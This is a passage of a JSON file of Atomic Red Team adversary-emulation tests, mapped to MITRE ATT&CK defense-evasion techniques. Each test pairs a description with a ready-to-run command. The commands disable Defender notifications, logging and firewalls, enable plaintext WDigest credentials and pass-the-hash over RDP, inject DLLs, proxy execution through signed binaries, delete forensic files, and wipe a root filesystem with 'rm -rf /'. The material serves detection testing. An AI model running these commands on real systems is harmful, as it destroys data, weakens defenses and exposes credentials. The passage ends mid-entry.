         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
         "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
         "command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f && reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
         "command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n",
         "command": "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0; Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
         "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
         "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\""
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
         "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f && reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
         "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
         "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
         "command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
      }
   ],
   "T1218.001": [
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Executes a CHM file with the ITS protocol handler.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
      },
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Executes a CHM file simulating a user double click.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm"
      },
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Executes a CHM file with the default Shortcut Command method.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
      },
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
         "command": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm"
      },
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
      },
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n",
         "command": "hh.exe \"9e2e6f_T1218.001.chm\""
      },
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
      },
      {
         "technique_id": "T1218.001",
         "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
         "tactic": "defense-evasion",
         "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n",
         "command": "hh.exe -decompile %temp% \"9e2e6f_T1218.001.chm\""
      }
   ],
   "T1218": [
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
         "command": "Gpscript /logon"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
         "command": ""
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
         "command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\""
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
         "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b && call \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx\""
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
         "command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
         "command": "InfDefaultInstall.exe \"67d07e_Infdefaultinstall.inf\""
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
         "command": "copy c:\\windows\\system32\\ie4uinit.exe %TEMP%\\ie4uinit.exe && copy \"cebed2_ieuinit.inf\" %TEMP%\\ieuinit.inf && %TEMP%\\ie4uinit.exe -BaseSettings"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n",
         "command": "if (-not (Test-Path C:\\test)) {; New-Item -Path C:\\test -ItemType Directory; } else {; Write-Host \"Directory C:\\test already exists.\" }; Copy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"C:\\test\\customshellhost.exe\" -Force; Copy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"C:\\test\\explorer.exe\" -Force; C:\\test\\customshellhost.exe"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n",
         "command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0 && reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe && c:\\windows\\system32\\provlaunch.exe LOLBin"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
         "command": "wuauclt.exe /UpdateDeploymentProvider \"6349c0_calc.dll\" /RunHandlerComServer"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
         "command": ""
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
         "command": "Gpscript /startup"
      },
      {
         "technique_id": "T1218",
         "technique_name": "Signed Binary Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
         "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\""
      }
   ],
   "T1070.004": [
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
         "command": "del /f %temp%\\deleteme_T1551.004"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Use the `shred` command to overwrite the temporary file and then delete it\n",
         "command": "shred -u /tmp/victim-shred.txt"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n",
         "command": "New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null; Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
         "command": "Remove-Item -Path C:\\Users\\puma-4\\Desktop\\deleteme_folder_T1551.004 -Recurse"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n",
         "command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n",
         "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
         "command": "Remove-Item -path C:\\Users\\puma-4\\Desktop\\deleteme_T1551.004"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
         "command": "rmdir /s /q %temp%\\deleteme_T1551.004"
      },
      {
         "technique_id": "T1070.004",
         "technique_name": "Indicator Removal on Host: File Deletion",
         "tactic": "defense-evasion",
         "description": "Deadman ability to delete agent file after termination.",
         "command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};\n"
      }
   ],
   "T1036.004": [
      {
         "technique_id": "T1036.004",
         "technique_name": "Masquerading: Masquerade Task or Service",
         "tactic": "defense-evasion",
         "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"",
         "command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" && sc qc win32times"
      },
      {
         "technique_id": "T1036.004",
         "technique_name": "Masquerading: Masquerade Task or Service",
         "tactic": "defense-evasion",
         "description": "Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to \"totally_legit\".  This will show up as process name in simple 'ps' listings.\n",
         "command": "/tmp/T1036_004_prctl_rename & ps; TMP=`ps | grep totally_legit`; if [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi; exit 0"
      },
      {
         "technique_id": "T1036.004",
         "technique_name": "Masquerading: Masquerade Task or Service",
         "tactic": "defense-evasion",
         "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"",
         "command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f && schtasks /query /tn win32times"
      }
   ],
   "T1562.004": [
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n",
         "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules; grep \"# THIS IS A COMMENT\" /etc/ufw/user.rules"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n",
         "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n",
         "command": "systemctl stop ufw"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "An adversary tries to modify the windows firewall registry\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "This test will attempt to allow an executable through the system firewall located in the Users directory",
